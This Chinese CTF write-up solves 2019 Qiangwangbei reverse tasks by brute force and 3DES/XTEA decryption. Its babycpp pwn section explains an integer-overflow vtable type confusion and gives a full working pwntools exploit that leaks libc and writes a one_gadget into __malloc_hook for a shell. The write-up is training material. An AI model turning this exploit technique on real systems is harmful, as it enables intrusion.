---
layout:     post
title:      "2019强网杯writeup"
subtitle:   "PWN+Reverse部分"
date:       2019-05-29 11:00:00
author:     "Chris"
catalog: true
tags:
    - Pwn
    - CTF
    - Reverse
 
---
> 持续更新中.....

# Reverse

#### JustRe

1.程序主要逻辑： 

输入为26个字符，过两个check即可得到flag：

![](/img/pic/2019QWB/1.jpg)


2.check1：

把前8个字符转成4字节16进制：“12345678” ---> 0x12345678

![](/img/pic/2019QWB/2.jpg)

同理下面代码不贴出来了，把第9、10个字符同样转成1字节16进制。

接下来是一系列sse指令操作,伪代码中v21是输入的第9-10位，v9是第1-8位

![](/img/pic/2019QWB/3.jpg)


![](/img/pic/2019QWB/4.jpg)

这段代码是实质是 根据输入v21与v9 把0x405018处的0x40字节解密

接下来是一个循环操作：

![](/img/pic/2019QWB/6.jpg)

v3是输入的1-8位，v11是9-10位，根据v3与v11 将0x405058处8个dword(0x20)的数据依次解密。

上面那些操作实际上完成了对0x405018-0x405078一共0x60字节数据的解密操作。

然后就是比较了，将0x405018与0x404148处的前0x60字节数据进行比较，若相同就将0x404148处的数据copy入0x405018

![](/img/pic/2019QWB/7.jpg)

这就是第一个check，将代码自修改，为第二个check做准备。

Py对上面的循环 v3与v11约束条件爆破，得到输入的前10位

```python
loc_405058=(0x1e47913f,0x1e87963c,0xfa0b0acd,0x035b0958,0xf5e74cf4,0xfa1261dc,0x854b2f05,0xf852ed82)


loc_404188=(0x24448840,0x24848d4c,0x000001fc,0x0f50006a,0x1c244411,0x000f58e8,0x8d406a00,0x02482484)


flag=0x10

table = '0123456789'
for i1 in (table):
	print i1
	for i2 in (table):
		print "eee= " +i2
		for i3 in table:
			for i4 in table:
				for i5 in table:
					for i6 in table:
						for i7 in table:
							for i8 in table:
								for i9 in table:
									for i10 in table:
										tmp = i1+i2+i3+i4+i5+i6+i7+i8
										ReR = int(tmp,16)
										ReL = int((i9 + i10),16)

										for i  in range(8):
											if ( (flag+ReR)^((0x1010101 * ReL +loc_405058[i])&0xffffffff)== loc_404188[i]):
												flag=flag+1
											else:
												flag=0x10
												break
										if (flag==0x18):
											print "flag :  " +i1+i2+i3+i4+i5+i6+i7+i8+i9+i10

```
得到flag前10位 1324220819

3.check2


IDA 现在无法反编译sub_4018A0()为伪代码，可以用winhex直接修改exe，手动把 sub_4018A0() 处的字节覆盖为新函数的字节。

再反编译

![](/img/pic/2019QWB/9.jpg)

对输入分组 8字节一组 补齐24字节，填充模式为：PKCS5 (padding的字节数目为8-(x%8))


![](/img/pic/2019QWB/10.jpg)


![](/img/pic/2019QWB/11.jpg)

进行了根据经验有点像des加密，多次des加密，猜测是3des加密。


然后加密结果与 507ca9e68709cefa20d50dcf90bb976c9090f6b07ba6a4e8 比较(后面8字节为填充字节的加密结果)

![](/img/pic/2019QWB/12.jpg)

动态调试时获取的192位的密钥 AFSAFCEDYCXCXACNDFKDCQXC

在线解密

![](/img/pic/2019QWB/13.jpg)

得到后16位输入 0dcc509a6f75849b

再加上前10位 flag = 13242208190dcc509a6f75849b

![](/img/pic/2019QWB/14.jpg)

bingo

[下载链接](https://github.com/yxshyj/project/tree/master/reverse/JustRe)

#### webassembly

在本地搭了一个www服务器动态调试，使用了WABT: The WebAssembly Binary Toolkit 反编译wasm文件找到main函数在func16

![](/img/pic/2019QWB/15.jpg)

![](/img/pic/2019QWB/16.jpg)

func15为加密与验证函数，在里面得出flag为38位

![](/img/pic/2019QWB/17.jpg)

常量delta=0x9e3779b9猜测是xtea加密

将明文前32位分四组迭代了32次分别进行xtea加密，动态调试分析到key=[0,0,0,0]
最后结果与固定常量异或求和。

![](/img/pic/2019QWB/18.jpg)


Py脚本:

```python
key = [0,0,0,0]
def xtea(rounds,v,key):
	v0 = v[0]
	v1 = v[1]
	delta = 0x9e3779b9
	sum = delta*rounds
	sum = sum & 0xffffffff
	for i in range(rounds):
		v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3])
		v1 = v1 & 0xffffffff
		sum -= delta
		sum = sum & 0xffffffff
		v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3])
		v0 = v0 & 0xffffffff
	v[0] = v0
	v[1] = v1


data = [183,-1,28,-19,30,11,115,8,122,-33,-78,29,-83,-22,-26,-96,-94,83, 23,-110,58,63,-16,-58,-6,68,-40,-98,82, 123,-128,48,98,98,99,98,57,125]
#print len(data)
for i in range(len(data)):
	data[i] = data[i] & 0xff
	
cipher = []
for i in range(0,len(data)-9,4):
	data2 = data[i]<<0
	data2 = data2 | (data[i+1]<<8)
	data2 = data2 | (data[i+2]<<16)
	data2 = data2 | (data[i+3]<<24)
	cipher.append(data2)

flag = ''

for i in range(0,len(cipher),2):
	de = []
	de.append(cipher[i])
	de.append(cipher[i+1])
	xtea(32,de,key)
	for j in range(0,len(de)):
		flag += hex(de[j])[2:-1].decode('hex')[::-1]

for i in range(len(data)-6,len(data)):
	flag += chr(data[i])

print flag


```

[下载链接](https://github.com/yxshyj/project/tree/master/reverse/webassembly)

# Pwn

#### babycpp

[bin和idc文件下载](https://github.com/yxshyj/project/tree/master/pwn/babycpp)

有两种类型可以选择创建，一种str，一种int

分析出的结构体

```c

struct Node{
    void * vtable;    
    char hash[16];   // init -> "\x00"
    _QWORD size;    // init -> 0x10
    _QWORD *content; // init -> malloc(0x80)
}

struct obj{
  char * data
  _QWORD size;
}
```

该程序在update_hash处，存在漏洞点。

```c
unsigned __int64 __fastcall update_hash(Node *a1)
{
  int offset; // [rsp+10h] [rbp-20h]
  int v3; // [rsp+14h] [rbp-1Ch]
  int i; // [rsp+18h] [rbp-18h]
  int v5; // [rsp+1Ch] [rbp-14h]
  char hash[8]; // [rsp+20h] [rbp-10h]
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  memset(hash, 0, 8uLL);
  printf("Input idx:", 0LL);
  scanf("%u", &offset);
  printf("Input hash:");
  v5 = read(0, hash, 0x10uLL);
  v3 = abs(offset) % 15;
  for ( i = 0; i < v5; ++i )
  {
    if ( v3 + i == 0x10 )
      v3 = 0;
    a1->hash[v3 + i] = hash[i];
  }
  return __readfsqword(0x28u) ^ v7;
}

```


abs(offset) % 15 语句是为了获取用户输入的偏移量，又防止用户输入超长度偏移量进行溢出攻击。但offset如果设置0x80000000时，当计算绝对值，变成正数之后，存在整数溢出，这条语句执行的结果就变为0xfffffff8，突破了原有的限制，可以进行向上溢出，溢出对象的vtable位置。通过这个漏洞可以将对象的vtable地址进行修改。

利用方式：

1.类型混淆，将str类型对象的vtable改成int类型的vtable，后3byte不同，1/16的正确几率。

2.str转 int 的vtable后 ，调用int对象的show函数可泄露content中的堆地址。

3.调用int_set,更改conten中的堆地址为 含有vtable地址的堆地址，再将对象int转换回str，调用str对象的show函数 泄露vtable地址,并计算出got表地址。

4.将str转int，调用int_set,在content中伪造obj结构`(void *data=malloc_hook,QWORD size=0x8)`，再在content中添加一指针指向该伪造的结构。再将int转str,调用str_set,设置content中的那个指针(指向伪造的obj结构)，实现往malloc_hook写one_gadget.

EXP:

```python

from pwn import *

context(os='linux', arch='amd64', log_level='debug')

p = process("./babycpp")

libc = ELF('./libc-2.27.so')

one_off=0x4f322
setvbuf_off=libc.symbols['setvbuf']
malloc_hook_off=libc.symbols['__malloc_hook']

def g(p):
    gdb.attach(p)
    raw_input()

def new_str():
    p.recvuntil("choice:")
    p.sendline(str(0))
    p.recvuntil("choice:")
    p.sendline(str(2))

def set_int(hash, idx, val):
    p.recvuntil("choice:")
    p.sendline(str(2))
    p.recvuntil("hash:")
    p.send(p64(hash))
    p.recvuntil("idx:")
    p.sendline(str(idx))
    p.recvuntil("val:")
    p.sendline(hex(val))

def show(hash, idx):
    p.recvuntil("choice:")
    p.sendline(str(1))
    p.recvuntil("hash:")
    p.send(p64(hash))
    p.recvuntil("idx:")
    p.sendline(str(idx))


def set_str(hash, idx, size, content, is_new=True):
    p.recvuntil("choice:")
    p.sendline(str(2))
    p.recvuntil("hash:")
    p.send(p64(hash))
    p.recvuntil("idx:")
    p.sendline(str(idx))
    if is_new:
        p.recvuntil("obj:")
        p.sendline(str(size))
        p.recvuntil("content:")
        p.send(content)    
    else:
        p.recvuntil("content:")
        p.send(content)


def update_hash(old, idx, content):
    p.recvuntil("choice:")
    p.sendline(str(3))
    p.recvuntil("hash:")
    p.send(p64(old))
    p.recvuntil("idx:")
    p.sendline(str(idx))
    p.recvuntil("hash:")
    p.send(content)


## leak heap address 
new_str()
set_str(0, 0, 0x10, '1'*0x10)
update_hash(0, 0x80000000, '\xe0\x5c')   #change to int 
show(0, 0)

p.recvuntil('The value in the array is ')
heap_addr = int('0x' + p.recv(12), 16)
print "heap_addr= "+hex(heap_addr)

## leak vtable address  ->  leak got address
heap_bin=heap_addr-0xc0
set_int(0, 0, heap_bin)
update_hash(0, 0x80000000, '\x00\x5d')  #change to str

show(0, 0)
p.recvuntil('Content:')
vtable_addr = u64(p.recv(6).ljust(0x8,"\x00"))
print "vtable_addr= " +hex(vtable_addr)
got_addr=vtable_addr+0x2011E0
print "got_addr= " + hex(got_addr)

## leak libc address
update_hash(0, 0x80000000, '\xe0\x5c') #change to int
heap_bin=heap_addr-0xc0+8
set_int(0, 0, heap_bin)
update_hash(0, 0x80000000, '\x00\x5d') #change to str
update_hash(0, 0, p64(got_addr))

show(got_addr,0)
p.recvuntil('Content:')
libc_addr = u64(p.recv(6).ljust(0x8,"\x00"))-setvbuf_off
print "libc= " +hex(libc_addr)

malloc_hook=libc_addr+malloc_hook_off
one=libc_addr+one_off

## set content -> fake obj heap  //  write one_gadget in __malloc_hook
update_hash(got_addr,0,p64(0))

update_hash(0, 0x80000000, '\xe0\x5c') #change to int
set_int(0, 0, malloc_hook)
set_int(0, 1, 0x8)
set_int(0, 2, heap_addr-0x90)

update_hash(0, 0x80000000, '\x00\x5d')  #change to str
set_str(0, 2, 0, p64(one), is_new=False)

## getshell 
p.recvuntil("choice:")
p.sendline(str(0))
p.recvuntil("choice:")
p.sendline(str(2))

p.interactive()

```
